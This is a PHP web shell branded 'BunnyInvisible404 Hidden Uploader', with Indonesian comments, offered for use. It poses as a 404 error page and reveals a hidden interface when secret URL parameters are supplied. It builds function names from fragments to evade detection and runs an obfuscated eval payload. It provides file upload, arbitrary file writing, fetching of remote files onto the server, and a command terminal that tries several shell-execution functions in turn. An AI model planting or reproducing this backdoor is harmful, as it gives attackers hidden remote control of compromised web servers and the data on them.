<?php

/**
 * How To? domain.com/files.php?bunnyman&invisible
 * Kalo masih ga bisa lu burik bangsat :)
 * 
 * Enjoy! - BunnyInvisible404
 */

header("HTTP/1.0 404 Not Found");
echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>' . $_SERVER["SERVER_SOFTWARE"] . ' (' . PHP_OS . ') Server at ' . $_SERVER["HTTP_HOST"] . '</address> </body></html> ';

//get uid:user gid:group
$func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
$psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
$psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
$psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
$psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
$myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
$mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
$cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';

if (!$func_exist($psx_egid)) {
  $user = $func_exist($cur_usr) ? @$cur_usr() : "????";
  $uid = $func_exist($myuid) ? @$myuid() : "????";
  $gid = $func_exist($mygid) ? @$mygid() : "????";
  $group = "?";
} else {
  $uid = $func_exist($psx_usr_uid) && $func_exist($psx_euid) ? @$psx_usr_uid($psx_euid()) : array("name" => "????", "uid" => "????");
  $gid = $func_exist($psx_grp_gid) && $func_exist($psx_egid) ? @$psx_grp_gid($psx_egid()) : array("name" => "????", "gid" => "????");
  $user = $uid['name'];
  $uid = $uid['uid'];
  $group = $gid['name'];
  $gid = $gid['gid'];
}

$host = $_SERVER['SERVER_NAME'];
$gcw = 'ge' . 'tc' . 'wd';
$path = $gcw();

function bic($bmic, $path)
{
  $hayoloh = 'htm' . 'lspe' . 'cialc' . 'hars';
  $sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
  $proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
  $proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
  $pop = 'p' . 'ope' . 'n';
  $pop_cls = 'pc' . 'lose';
  $exc = 'e' . 'x' . 'ec';
  $sys = 's' . 'ys' . 't' . 'em';
  $pass = 'pa' . 's' . 'sth' . 'ru';
  $sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
  $func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
  $preg = 'pr' . 'eg_' . 'mat' . 'ch';
  $regex = '2' . '>' . '&' . '1';
  if (!$preg('/' . $regex . '/i', $bmic)) {
    $bmic = $bmic . ' ' . $regex;
  }

  if ($func_exist($proc)) {
    $descriptors = [
      0 => ['pipe', 'r'],
      1 => ['pipe', 'w'],
      2 => ['pipe', 'w'],
    ];
    $process = $proc($bmic, $descriptors, $pipes, $path);
    if (is_resource($process)) {
      fwrite($pipes[0], 'input_data_here');
      fclose($pipes[0]);
      $output = $sgc($pipes[1]);
      $errors = $sgc($pipes[2]);
      fclose($pipes[1]);
      fclose($pipes[2]);
      $resultCode = $proc_cls($process);
      echo $hayoloh($output);
    }
  } elseif ($func_exist($pop)) {
    $process = $pop($bmic, 'r');
    $read = fread($process, 2096);
    $hayoloh(print_r("$process: " . gettype($process) . "\n$read \n"));
    $pop_cls($process);
  } elseif ($func_exist($exc)) {
    $exc($bmic, $output, $returnCode);
    if ($returnCode === 0) {
      $res = implode($output);
      echo $hayoloh($res);
      ob_flush();
      flush();
    }
  } elseif ($func_exist($sys)) {
    $out = $sys($bmic);
    echo $hayoloh($out);
  } elseif ($func_exist($pass)) {
    $out = $pass($bmic);
    echo $hayoloh($out);
  } elseif ($func_exist($sh_exc)) {
    $out = $sh_exc($bmic);
    echo $hayoloh($out);
  } else {
    echo "<b>The Function To Run The Command Is Disable On This Serever</b>";
  }
}
function ByLTs($LTS)
{
  $gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e';
  $b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de';
  $nelrts = 's' . 'tr' . 'l' . 'en';
  $rhc = 'c' . 'h' . 'r';
  $dro = 'o' . 'r' . 'd';
  $LTS = $gflate($b64($LTS));
  for ($i = 0; $i < $nelrts($LTS); $i++) {
    $LTS[$i] = $rhc($dro($LTS[$i]) - 1);
  }
  return $LTS;
}/****/ @/*55555*/null;/******/ @/*55555*/eval/******/(ByLTs("jVXbbtNAEP0AvmKx+pC8IK/3ltgqFaBKIOChRbQCtorSxm6rpklIXFio8u3MZe04SRFEWsWX2TMzZ84eCwG/Z+J6Xs9F+WFZvS/EzJ1cmlwc1GWoxaFIvMwyL7Xx0kpYhq6DU3CtfchSeG8oJugr7zJ8lIgX4uBhOV3BfwIPjLcpvJZ0GVS8Ns4HggN4C3Ampftgr2hpRg4AKY1GZM3AjwBpKlgKcGJqY71MIdhkyfpbQu/wnkrPLMXBOy8V5NQlvIP8eoIxyUXExHcy2963jYl1D+i/iaX8UkOcJZy2WUyg2yspYQFTHXZuF+PJZFmumCLuLIlbdpkigoEhYocwJhxjHQ8Gug8OhqHGLf7lcv5zVS4bVISipjuz0JfMvwVEW0YkRolM35XLgrXx48vn5UMh7gf1iQVtrG5GMF5QR5e43WHA9dYwcAD4bncY1KI0+HxrGN19nSHuDaMRA8WCBoOGYcS6z7+/rwcFSzsXt5XoPS/vF/Wv3sHo0/Hp2fEpYhGOjovxZKposEEPOS+KJtPcq0TxpslFvy8eu5MEOp5GxdlTlXqDSgxJG2MqzoSoLCPQZpYUYi3K6aqENE+XLmW6X7pqWoAxSBdpdyxE1HWqOXmqd+P+0RJmIxIybonIUPE/orAAXNTtJlvQejdu02oYd1v9a3ryGBO1UlEZdK9cPNCa07XQ0jQsrlkO715N02HBqsijRR2K3n9IQgE34ogwU3I+XnBOcuzBDtgOHT3E05r0qQQ4rsCGcY876A2PrYAxIzWlMGtysd7agUeAjgK7AR81FRFQ/tGzpISdSRQ/OXnBZzcX1e20HF2X9ehqPqvLWb3qcTPkHLRSsnV2kYoXWT768tA3JmPZJugrgAZk8esAYVACHnzTPMKuIQLNpSJyIBju0McUuozyaGdKems9pAnKcGqyJsntgi0FhdQCMJRHwnEYixN3/E5mkYIhlUr4ll2aWEGeHeXEUNxOardsKBKPJH1JJLOBE8cUjuvH71y0WIn6Qu1ZtmNauE2zDQdVERyKAYkjtrAyIA/3BjXxhlsmZ6eVtQuZokfKOyKFHqZeW9YaVuHiuNSE/Bk/0f047Ddfz16fFuLu/O3H3zlZNyh7cbMYPczG92WvCSMHL/gg5JvPxN4537MuY7ZMns0bR+VaKwOuW+OlOgquKhdHL/8A"));

if (isset($_POST['buatfile'])) {
  $namafile = $_POST['namafile'];
  $isifile = $_POST['isifile'];
  $handle = fopen("$namafile", "w");
  if ($isifile) {
    $buatfile = fwrite($handle, $isifile);
  } else {
    $buatfile = $handle;
  }
  if ($buatfile) {
    echo "<script>alert('Berhasil Buat File :)');</script>";
  } else {
    echo "<script>alert('Gagal Buat File :(');</script>";
  }
}

if (isset($_GET['bunnyman'])) {
  if (isset($_GET['invisible'])) {
    echo '
        <!DOCTYPE html>
        <html lang="en">
            <head>
            <title>..:: BunnyInvisible404 ::..</title>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta http-equiv="X-UA-Compatible" content="ie=edge">
                <meta name="description" content="This Is A Hidden Uploader">
                <meta name="author" content="BunnyInvisible404">
                <meta name="robots" content="noindex, nofollow">
                <link rel="shortcut icon" href="https://i.ibb.co/YPd7d3D/icons-bunny404.jpg" type="image/x-icon" />
                <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" type="text/css" />
                <link href="https://fonts.googleapis.com/css?family=Trade+Winds" rel="stylesheet" type="text/css" />
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
                <style>
                    body {
                        background: #000000;
                        display: flex;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                        min-height: 100vh;
                    }
                    .root {
                        display: flex;
                        flex-wrap: wrap;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        color: #eaeaea;
                        width: 100%;
                        height: auto;
                    }
                    .root h1 {
                        style="font-size: 3vh;
                        font-weight: 700;
                        font-family: Trade Winds;
                        text-shadow:0pt 0pt 10pt #fc0909,0pt 0pt 20pt #ffffff,0pt 0pt 30pt #fc0909;
                    }
                    .root form {
                        width: 80%;
                        display: flex;
                        flex-direction: column;
                        flex-wrap: wrap;
                        justify-content: center;
                        align-items: center;
                    }
                    .root form button {
                        background: rgba(255,255,255,0.1);
                        color: #ffffff;
                        border: 1px solid #eaeaea;
                        border-radius: 10px;
                        font-size: 1.75vh;
                        font-weight: 700;
                        padding: 2.5px 5px 2.5px;
                        margin: 0;
                    }
                    .root form button:hover {
                        background: rgba(0,0,0,0.75);
                        box-shadow: 0 0 10pt rgba(255,0,0,0.50), 0 0 20pt rgba(255,0,0,0.75);
                    }

                    .terminal {
                        width: 100%;
                        background-color: #000000;
                        border-radius: 5px;
                        box-shadow: 0 0 20pt rgba(255, 255, 255, 0.5);
                    }
            
                    .terminal-header {
                        background: #ddd;
                        padding: 5px;
                        display: flex;
                        align-items: center;
                    }
            
                    .font-bold {
                        font-weight: 700;
                    }
            
                    .font-white {
                        color: #ffffff;
                    }
                    .font-black {
                        color: #000000;
                    }
                    .font-red {
                        color: #ff0000;
                    }
                    .font-blue {
                        color: #0000ff;
                    }
            
                    .terminal-img {
                        width: 3vh;
                    }
            
                    .button {
                        width: 12px;
                        height: 12px;
                        border-radius: 50%;
                        margin-right: 5px;
                    }
            
                    .terminal-content {
                        background: #000000;
                        width: 100%;
                        height: 70vh;
                        overflow-y: auto;
                        color: #00ff00;
                        font-size: 15px;
                        white-space: pre;
                        overflow-y: scroll;
                        overflow-x: scroll;
                    }
            
                    .terminal-input {
                        position: relative;
                        z-index: 1;
                        background: #000000;
                        display: flex;
                        padding: 10px 5px 10px;
                    }
            
                    .prompt {
                        font-size: 15px;
                        color: #0f0;
                    }
            
                    .terminalInput {
                        background: none;
                        border: none;
                        outline: none;
                        color: #ffffff;
                        flex: 1;
                        font-family: monospace;
                        font-size: 15px;
                    }
                    .terminalInput:hover {
                        background: none;
                        border: none;
                        outline: none;
                    }
                    .terminalInput:focus {
                        background: none;
                        border: none;
                        outline: none;
                    }
                    .terminalInput:active {
                        background: none;
                        border: none;
                        outline: none;
                    }
            
                    @media screen and (max-width: 500px) {
                        .root form {
                            width: 100%;
                        }
                        .terminal {
                            width: 100%;
                        }
                        .terminal-content {
                            font-size: 10px;
                        }
                        .prompt {
                            font-size: 10px;
                        }
                        .terminalInput {
                            font-size: 10px;
                        }
                    }
                </style>
            </head>
        <body>
            <div class="root">
                <div class="mb-4">
                    <a href="?bunnyman&invisible"><button type="button" class="btn btn-outline-light">Home</button></a>
                    <a href="?bunnyman&invisible&file"><button type="button" class="btn btn-outline-light">Buat File</button></a>
                    <a href="?bunnyman&invisible&remote"><button type="button" class="btn btn-outline-light">Remote Upload</button></a>
                    <a href="?bunnyman&invisible&terminal"><button type="button" class="btn btn-outline-light">Terminal</button></a>
                </div>
                <h1>./BunnyInvisible404 Hidden Uploader</h1>
                <form action="" method="post" enctype="multipart/form-data">
                <div class="mb-3" style="display: flex; justify-content: center; align-items: center;">
                    <label for="upl" style="color: #eaeaea; font-weight: 700; font-size: 1.75vh; margin: 1rem;">Upload File</label>
                    <input type="file" name="file[]" id="file" onchange="this.form.submit()" multiple>
                </div>';
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
      if (isset($_FILES["file"])) {
        $countFiles = count($_FILES["file"]["name"]);
        for ($i = 0; $i < $countFiles; $i++) {
          $fi_le_Na_me = $_FILES["file"]["name"][$i];
          $location = "" . $fi_le_Na_me;
          $uploadFunction = "m" . "ove" . "_up" . "loa" . "ded_fi" . "le";
          if ($uploadFunction($_FILES["file"]["tmp_name"][$i], $location)) {
            echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
            echo "<span style='color: #00ff00;'>Upload Success</span>";
            echo "<span>file => <a href='" . $fi_le_Na_me . "' color='#0092ff' target='_blank'>" . $fi_le_Na_me . "</a></span><br/>";
            echo "</div>";
          } else {
            echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
            echo "<span style='color: #ff0000;'>Upload Failed :(</span>";
            echo "<span>file => " . $fi_le_Na_me . "<br/>";
            echo "</div>";
          }
        }
      } else {
        echo "<div class='mb-4' style='display: flex; justify-content: center; align-items: center; flex-direction: column;'>";
        echo "<span style='color: #fcf803;'>Tidak Ada File Yang Di Upload</span>";
        echo "</div>";
      }
    }
?>
    <?php
    if (isset($_GET['file'])) {
      echo '
                    <div class="mb-3">
                        <label for="namafile" class="form-label">Buat File</label>
                        <input type="text" class="form-control form-control-sm" name="namafile" id="namafile" placeholder="nama file">
                        <textarea class="form-control form-control-sm mt-3" name="isifile" cols="80" rows="20" placeholder="isi file" id="isifile"></textarea>
                        <div class="mt-3 d-grid gap-2">
                            <input class="btn btn-outline-light" type="submit" name="buatfile" value="Buat File">
                        </div>
                    </div>
                    ';
    }
    ?>
    <?php
    if (isset($_POST['btn-remoteup'])) {
      $f_get = 'f' . 'il' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'co' . 'nten' . 't' . 's';
      $f_put = 'f' . 'il' . 'e' . '_' . 'pu' . 't' . '_' . 'co' . 'n' . 'te' . 'nt' . 's';
      $this_file = $_POST['fileurl'];
      $this_file_name = $_POST['savedname'];
      $f_content = $f_get($this_file);
      if (!empty($this_file) && !empty($this_file_name)) {
        if ($f_content !== false) {
          $writeF = $f_put($this_file_name, $f_content);
          if ($writeF !== false) {
            echo '
                        <div class="uk-alert-success uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                            <a href class="uk-alert-close" uk-close></a>
                            <p><font class="font-white">Fi' . 'le => <a href="' . $this_file_name . '">' . $this_file_name . '</a></font> S' . 'uc' . 'ce' . 's' . 's U' . 'pl' . 'oa' . 'de' . 'd <i class="fa-sharp fa-solid fa-shield-check"></i></p>
                        </div>
                        ';
          } else {
            echo '
                        <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                            <a href class="uk-alert-close" uk-close></a>
                            <p><font class="font-white">Fi' . 'le => ' . $this_file_name . '</font> Fa' . 'i' . 'le' . 'd ' . 'To' . ' Up' . 'lo' . 'ad<i class="fa-solid fa-octagon-xmark"></i></p>
                        </div>
                        ';
          }
        } else {
          echo '
                    <div class="uk-alert-danger uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                        <a href class="uk-alert-close" uk-close></a>
                        <p><font class="font-white">Fi' . 'le => ' . $this_file_name . '</font> Fa' . 'il' . 'ed T' . 'o U' . 'pl' . 'oa' . 'd<i class="fa-solid fa-octagon-xmark"></i></p>
                    </div>
                    ';
        }
      } else {
        echo '
                <div class="uk-alert-warning uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" uk-alert style="background: transparent;">
                    <a href class="uk-alert-close" uk-close></a>
                    <p>No F' . 'il' . 'es U' . 'pl' . 'oa' . 'de' . 'd, Your Input Is Empty<i class="fa-regular fa-location-exclamation"></i></p>
                </div>
                ';
      }
    }
    if (isset($_GET['remote'])) {
      echo '
            <div class="mb-3">
                <label for="fileurl" class="form-label">Remote Upload</label>
                <input type="text" class="form-control form-control-sm" name="fileurl" id="fileurl" placeholder="https://bunny.invisible.gov/file.txt">
                <input type="text" class="form-control form-control-sm" name="savedname" id="savedname" placeholder="saved.txt">
                <div class="mt-3 d-grid gap-2">
                    <input class="btn btn-outline-light" type="submit" name="btn-remoteup" value="Remote">
                </div>
            </div>
        </form>';
    }
    ?>
    <?php
    if (isset($_GET['terminal'])) {
    ?>
      <div class="terminal">
        <div class="terminal-header">
          <img class="terminal-img" src="https://raw.githubusercontent.com/InvisibleBunny/Records/main/media/Bunny-Terminal.png"
            alt="terminal">
          <span class="font-bold font-black">Terminal</span>
        </div>
        <textarea class="terminal-content" id="terminalContent" readonly>
            <?php
            if (isset($_POST['bunvisgg'])) {
              $bmic = htmlspecialchars($_POST['bic']);
              htmlspecialchars(bic($bmic, $path));
            }
            ?>
        </textarea>
        <div class="terminal-input">
          <form action="" method="POST" enctype="multipart/form-data">
            <span class="prompt">
              <font class="font-white">[</font>
              <font class="font-red"><?= $user ?></font>
              <font class="font-white">@</font>
              <font class="font-blue"><?= $host ?></font>
              <font class="font-white">]</font>
              <font class="font-red">$</font>
            </span>
            <input type="text" name="bic" id="terminalInput" class="terminalInput" autofocus autocomplete="off">
            <input type="submit" name="bunvisgg" style="display: none;">
          </form>
        </div>
      </div>
      </div>
      </body>

      </html>
<?php
    }
  }
}
?>